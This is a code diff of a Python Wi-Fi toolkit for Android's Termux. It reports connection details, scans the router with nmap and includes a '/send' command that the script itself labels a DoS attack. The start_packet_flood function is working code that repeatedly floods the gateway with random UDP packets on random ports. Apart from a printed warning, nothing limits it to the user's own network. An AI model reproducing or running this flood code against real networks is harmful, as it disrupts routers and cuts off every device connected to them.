@@ -12,29 +12,40 @@ import sys
 def run_command(command):
     """Executes a system command and returns its output."""
     try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True, encoding='utf-8')
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=False, encoding='utf-8')
+        if result.returncode != 0:
+            return "" # Return empty string on error to allow fallbacks
         return result.stdout.strip()
-    except subprocess.CalledProcessError as e:
-        return f"Error: {e.stderr.strip()}"
     except FileNotFoundError:
-        return f"Error: Command '{command.split()[0]}' not found."
+        return ""
 
 def get_gateway_ip():
     """
-    Finds the gateway (router) IP in Termux using multiple methods for reliability.
+    Finds the gateway (router) IP using a robust, multi-fallback logic.
     """
-    # Method 1: Try getprop (more direct and reliable on Android)
-    output = run_command("getprop dhcp.wlan0.gateway")
-    if output and re.match(r"\d+\.\d+\.\d+\.\d+", output):
-        return output.strip()
-
-    # Method 2: Fallback to parsing 'ip route' (standard Linux method)
+    # Method 1 (Primary): Parse 'ip route'. Most reliable and standard method.
     output = run_command("ip route")
     match = re.search(r'default via (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
     if match:
+        # print("[Debug] Found gateway via 'ip route'")
         return match.group(1)
 
-    return None # Return None if both methods fail
+    # Method 2 (Android-specific Fallback): Use getprop.
+    output = run_command("getprop dhcp.wlan0.gateway")
+    if output and re.match(r"^\d+\.\d+\.\d+\.\d+$", output):
+        # print("[Debug] Found gateway via 'getprop'")
+        return output.strip()
+
+    # Method 3 (Classic Fallback): Use 'netstat'. Requires 'net-tools' package.
+    output = run_command("netstat -rn")
+    if output:
+        # Search for the line with destination 0.0.0.0
+        match = re.search(r'^0\.0\.0\.0\s+([\d\.]+)\s+0\.0\.0\.0', output, re.MULTILINE)
+        if match:
+            # print("[Debug] Found gateway via 'netstat'")
+            return match.group(1)
+
+    return None # Return None if all methods fail
 
 def print_header(title):
     """Prints a colored header."""
@@ -42,6 +53,8 @@ def print_header(title):
 
 def print_label_value(label, value, color="\033[1;32m"):
     """Prints a label-value pair."""
+    if not value or value.isspace():
+        value = "N/A"
     print(f"{label:<25}: {color}{value}\033[0m")
 
 # --- Main Toolkit Functions ---
@@ -56,29 +69,23 @@ def show_wifi_info():
     if "Error" not in wifi_info_json and wifi_info_json:
         try:
             data = json.loads(wifi_info_json)
-            rssi = data.get("rssi", "N/A")
-            # Approximate RSSI to Quality (%) conversion
+            rssi = data.get("rssi")
+            quality_str = "N/A"
             if isinstance(rssi, int):
-                if rssi > -50:
-                    quality = "Excellent"
-                elif rssi > -70:
-                    quality = "Good"
-                elif rssi > -80:
-                    quality = "Fair"
-                else:
-                    quality = "Poor"
+                if rssi > -50: quality = "Excellent"
+                elif rssi > -70: quality = "Good"
+                elif rssi > -80: quality = "Fair"
+                else: quality = "Poor"
                 quality_str = f"{quality} ({rssi} dBm)"
-            else:
-                quality_str = "N/A"
 
-            print_label_value("SSID", data.get("ssid", "N/A"))
-            print_label_value("BSSID (AP MAC)", data.get("bssid", "N/A"))
+            print_label_value("SSID", data.get("ssid"))
+            print_label_value("BSSID (AP MAC)", data.get("bssid"))
             print_label_value("Signal Quality", quality_str)
-            print_label_value("Link Speed", f"{data.get('link_speed_mbps', 'N/A')} Mbps")
-            print_label_value("Frequency", f"{data.get('frequency_mhz', 'N/A')} MHz")
-            print_label_value("Local IP", data.get("ip", "N/A"))
+            print_label_value("Link Speed", f"{data.get('link_speed_mbps')} Mbps" if data.get('link_speed_mbps') else None)
+            print_label_value("Frequency", f"{data.get('frequency_mhz')} MHz" if data.get('frequency_mhz') else None)
+            print_label_value("Local IP", data.get("ip"))
             print_label_value("Public IP", run_command("curl -s ifconfig.me"))
-            print_label_value("Supplicant State", data.get("supplicant_state", "N/A"))
+            print_label_value("Supplicant State", data.get("supplicant_state"))
         except json.JSONDecodeError:
             print_label_value("Error", "Could not parse termux-api output.")
     else:
@@ -87,15 +94,13 @@ def show_wifi_info():
     # 2. Network Details (Gateway, DNS)
     print("\n\033[1;36m[+] Network Details\033[0m")
     gateway_ip = get_gateway_ip()
+    print_label_value("Gateway (Router)", gateway_ip)
+    
     if gateway_ip:
-        print_label_value("Gateway (Router)", gateway_ip)
-        # Ping the gateway for local latency
         ping_output = run_command(f"ping -c 3 {gateway_ip}")
         latency_match = re.search(r'min/avg/max/mdev = [\d.]+/([\d.]+)/', ping_output)
         latency = f"{latency_match.group(1)} ms" if latency_match else "N/A"
         print_label_value("Latency (to Gateway)", latency)
-    else:
-        print_label_value("Gateway (Router)", "Not found")
 
     dns1 = run_command("getprop net.dns1")
     dns2 = run_command("getprop net.dns2")
@@ -107,13 +112,10 @@ def show_wifi_info():
         print("\n\033[1;36m[+] Advanced Gateway Scan (may take a moment)\033[0m")
         print(f"Running 'nmap -F {gateway_ip}'...")
         nmap_output = run_command(f"nmap -F {gateway_ip}")
-        print("\033[0;33m" + nmap_output + "\033[0m")
-
+        print("\033[0;33m" + (nmap_output if nmap_output else "Nmap scan failed or returned no output.") + "\033[0m")
 
 def start_packet_flood(amount_str):
-    """
-    Sends a burst of UDP packets to the gateway to test network stability.
-    """
+    """Sends a burst of UDP packets to the gateway to test network stability."""
     print_header("Wi-Fi Stress Test (DoS Attack)")
     print("\033[1;31m*** WARNING: YOU ARE ABOUT TO INITIATE A DENIAL OF SERVICE ATTACK ***\033[0m")
     print("\033[1;33mUse this only on your own network. It may disconnect all connected devices.\033[0m")
@@ -135,38 +137,31 @@ def start_packet_flood(amount_str):
         return
 
     print(f"\nTarget: Gateway ({gateway_ip})")
-    print(f"Mode: {amount} UDP packets every 3 seconds.")
+    print(f"Mode: {amount} UDP packets every 50 seconds.")
     print("\033[1;36mPress Ctrl+C to stop the attack cycle.\033[0m")
-    time.sleep(2)
+    time.sleep(3)
 
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # 1024 bytes of random data
-        payload = random.randbytes(1024) 
-        
+        payload = random.randbytes(1024)
         cycle = 1
         while True:
             print(f"\n--- Cycle #{cycle} ---")
             print(f"Sending {amount} packets to {gateway_ip}...")
-            
             for i in range(amount):
-                # Choose a random port for each packet to vary the attack
                 port = random.randint(1025, 65535)
                 s.sendto(payload, (gateway_ip, port))
-                # Print progress without a newline
                 print(f"\rPackets sent: {i+1}/{amount}", end="")
             
-            print("\n\033[1;32mBurst complete.\033[0m Waiting for 2 seconds...")
-            time.sleep(2)
+            print("\n\033[1;32mBurst complete.\033[0m Waiting for 50 seconds...")
+            time.sleep(50)
             cycle += 1
-
     except KeyboardInterrupt:
         print("\n\n\033[1;31mAttack stopped by user.\033[0m")
     except Exception as e:
         print(f"\n\n\033[1;31mAn error occurred: {e}\033[0m")
     finally:
         s.close()
-
 
 def show_help():
     """Shows available commands."""
@@ -179,7 +174,6 @@ def show_help():
 
 def main():
     """Main loop for the toolkit."""
-    # Check dependencies
     if "not found" in run_command("termux-wifi-connectioninfo --version"):
         print("\033[1;31mError: 'termux-api' does not seem to be installed or working.\033[0m")
         print("Run 'pkg install termux-api' and install the Termux:API app.")
@@ -187,42 +181,35 @@ def main():
 
     os.system("clear")
     print("\033[1;34m=====================================\033[0m")
-    print("\033[1;36m    Python Wi-Fi Toolkit for Termux by huawetto\033[0m")
+    print("\033[1;36m    Python Wi-Fi Toolkit for Termux\033[0m")
     print("\033[1;34m=====================================\033[0m")
     print("Type 'help' for a list of commands.")
 
     while True:
         try:
-            raw_input = input("\n\033[1;35mtoolkit> \033[0m").strip()
-            if not raw_input:
+            raw_input_str = input("\n\033[1;35mtoolkit> \033[0m").strip()
+            if not raw_input_str:
                 continue
 
-            parts = raw_input.split()
+            parts = raw_input_str.split()
             command = parts[0].lower()
 
-            if command == "info":
-                show_wifi_info()
+            if command == "info": show_wifi_info()
             elif command == "/send":
-                if len(parts) > 1:
-                    start_packet_flood(parts[1])
-                else:
-                    print("\033[1;31mUsage: /send <number_of_packets>\033[0m")
-            elif command == "help":
-                show_help()
-            elif command == "clear":
-                os.system("clear")
+                if len(parts) > 1: start_packet_flood(parts[1])
+                else: print("\033[1;31mUsage: /send <number_of_packets>\033[0m")
+            elif command == "help": show_help()
+            elif command == "clear": os.system("clear")
             elif command == "exit":
                 print("Exiting...")
                 break
             else:
                 print(f"\033[1;31mCommand '{command}' not recognized. Type 'help'.\033[0m")
-
         except KeyboardInterrupt:
             print("\nExiting... (Ctrl+C detected)")
             break
         except Exception as e:
             print(f"\n\033[1;31mAn unexpected error occurred: {e}\033[0m")
-
 
 if __name__ == "__main__":
     main()
